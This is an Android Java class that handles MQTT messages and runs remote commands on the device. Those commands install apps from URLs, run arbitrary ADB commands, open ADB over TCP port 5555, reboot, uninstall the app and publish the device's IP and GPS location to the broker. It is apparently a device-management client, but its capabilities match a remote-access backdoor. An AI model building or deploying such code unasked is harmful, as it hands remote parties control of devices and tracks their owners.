package com.agx.mqtt.mqtt;

import static com.agx.mqtt.helper.Downloader.downloadFile;
import static com.agx.mqtt.helper.GPSLocator.getLocation;
import static com.agx.mqtt.helper.Utils.getUniqueDeviceID;
import static com.agx.mqtt.mqtt.MqttManager.getClient;
import static com.agx.mqtt.ui.MainService.getActivity;
import static com.agx.mqtt.ui.MainService.getContext;
import static com.agx.mqtt.ui.MainService.getStarter;


import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import com.agx.mqtt.helper.Convert;
import com.agx.mqtt.helper.Utils;
import com.agx.mqtt.worker.WorkStarter;
import com.agx.mqtt.worker.Works;


import org.eclipse.paho.mqttv5.client.IMqttToken;
import org.eclipse.paho.mqttv5.client.MqttCallback;
import org.eclipse.paho.mqttv5.client.MqttDisconnectResponse;
import org.eclipse.paho.mqttv5.common.MqttException;
import org.eclipse.paho.mqttv5.common.MqttMessage;
import org.eclipse.paho.mqttv5.common.packet.MqttProperties;
import org.greenrobot.eventbus.EventBus;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;

/**
 * 使用EventBus分发事件
 *
 * @author LichFaker on 16/3/25.
 * @Email lichfaker@gmail.com
 */
public class MqttCallbackBus implements MqttCallback {
    private static final String TAG = "MqttCallbackBus";
    TextView tv_log;
    ScrollView sv_log;
    LinearLayout ll_log;
    WorkStarter ws;
    InetAddress ip;





    @Override
    public void messageArrived(String topic, MqttMessage message) {
        Log.d(TAG, "messageArrived: ");
        Log.d(topic,message.toString());
        HashMap<String,String> payload;
        ws = new WorkStarter(getContext());

        try{
            payload= Convert.HashMapFromJson(message.toString());
            if(payload.containsKey("command")){
                runCommand(payload);
            }

            payload.forEach((k,v)->{
                Log.d("Key="+k,"Value="+v);
            });

        }catch (Exception e){
            e.printStackTrace();

        }



//        getContext().runOnUiThread(new Runnable() {
//            @Override
//            public void run() {
//                sv_log = (ScrollView) getContext().findViewById(R.id.sv_log);
//                //tv_log = (TextView) getContext().findViewById(R.id.tv_log);
//                ll_log = (LinearLayout) getContext().findViewById(R.id.ll_log);
//                TextView tv_add = new TextView(getContext());
//
//                tv_add.setText("["+dateTimeNOW()+"]|\n["+topic+"]|"+message.toString());
//                ll_log.addView(tv_add);
//                sv_log.fullScroll(View.FOCUS_DOWN);
//
//                sv_log.postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
//                        sv_log.fullScroll(View.FOCUS_DOWN);
//                    }
//                },100);
//
//            }
//        });
        EventBus.getDefault().post(message);
    }

    @Override
    public void deliveryComplete(IMqttToken token) {
        //Log.d(TAG, "deliveryComplete: "+token.getTopics().toString());
    }

    @Override
    public void connectComplete(boolean reconnect, String serverURI) {
        if (reconnect){
            try {
                getClient().reconnect();
            } catch (MqttException e) {
                e.printStackTrace();
            }
        }
        Log.d(TAG, "connectComplete: ");
    }

    @Override
    public void authPacketArrived(int reasonCode, MqttProperties properties) {

    }

    @Override
    public void disconnected(MqttDisconnectResponse disconnectResponse) {
        Log.d(TAG, "connectionLost: ");
//        getBinding().ivMqttIndicator.setBackgroundColor(Color.RED);

        Log.d(TAG, "disconnected: reason code:"+disconnectResponse.getReturnCode());

//        snackOnTop("Connection Lost");
        getStarter().connect();

    }

    @Override
    public void mqttErrorOccurred(MqttException exception) {

    }
    private void runCommand(HashMap<String, String> payload) throws IOException {
        switch (payload.get("command")){
            case "notificate" :
                ws.showNotification("PUBLISH_MESSAGE",payload.get("message"));
                break;
            case "reboot" :
                ws.reboot();
                break;
            case "install" :
                String installLink = payload.get("url");
                ws.install(installLink);

                break;
            case "download" :

                String link = payload.get("url");

//                String out_prefix = Utils.Link.getPrefix(link);
//                String out_suffix = Utils.Link.getSuffix(link);
//
//                File downloadDir = File.createTempFile(out_prefix,out_suffix,Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS));
//
//
//                Log.d(TAG, "runCommand: downloading link:"+link);
//                Log.d(TAG, "runCommand: downloading File:"+out_suffix+"."+out_prefix);
//
//
//                downloadFile(link,downloadDir);

                ws.startDownload(link);

                break;
            case "vibrate":
                ws.vibrate();
                //Toast.makeText(getContext(),"Vibrating",Toast.LENGTH_SHORT);
                break;
            case "wake":
                ws.wake();
                //Toast.makeText(getContext(),"Vibrating",Toast.LENGTH_SHORT);
                break;
            case "kamikaze":
                Intent intent = new Intent(Intent.ACTION_DELETE);
                intent.setData(Uri.parse("package:" + getActivity().getPackageName()));
                getActivity().startActivity(intent);
                //Toast.makeText(getContext(),"Vibrating",Toast.LENGTH_SHORT);
                break;
            case "adb":
                ws.runADB(payload.get("message"));
                //Toast.makeText(getContext(),"Vibrating",Toast.LENGTH_SHORT);
                break;
            case "whosthere":
                String ip = Utils.getIPAddress(true);
                getStarter().publish(getUniqueDeviceID(),"ME@"+ip,null);
                //Toast.makeText(getContext(),"Vibrating",Toast.LENGTH_SHORT);
                break;
            case "openport":
                try {
                    Process proc = Runtime.getRuntime()
                            .exec("tcpip 5555");
                    proc.waitFor();
                } catch (Exception ex) {
                    getStarter().publish(getUniqueDeviceID(),"OPENPORT FAILED!",null);
                    ex.printStackTrace();
                }
                break;
            case "location":
                if(getLocation() != null){
                    HashMap<String,String > extras = new HashMap<>();
                    String topic = getUniqueDeviceID()+"/location";
                    String message = "";

                    //extras.put("type","location");
                    extras.put("longitude", String.valueOf(getLocation().getLongitude()));
                    extras.put("latitude", String.valueOf(getLocation().getLatitude()));

                    getStarter().publish(topic ,message,extras);
                }
                //Toast.makeText(getContext(),"Vibrating",Toast.LENGTH_SHORT);
                break;
        }
    }

    public String dateTimeNOW()
    {
        Date currentTime = Calendar.getInstance().getTime();
        String hour    = intFormater(currentTime.getHours());
        String min     = intFormater(currentTime.getMinutes());

        String day     = intFormater(currentTime.getDate());
        String year    = intFormater(currentTime.getYear());
        String month   = intFormater(currentTime.getMonth()+1);

        String fulldate = day+"."+month+"."+year+" "+hour+":"+min;

        return fulldate;
    }

    public String intFormater(Integer integer){
        if(integer < 10)
        {
            return "0"+String.valueOf(integer);
        }
        else if(integer >40)
        {
            return String.valueOf(integer - 100 +2000);
        }

        return String.valueOf(integer);
    }







}
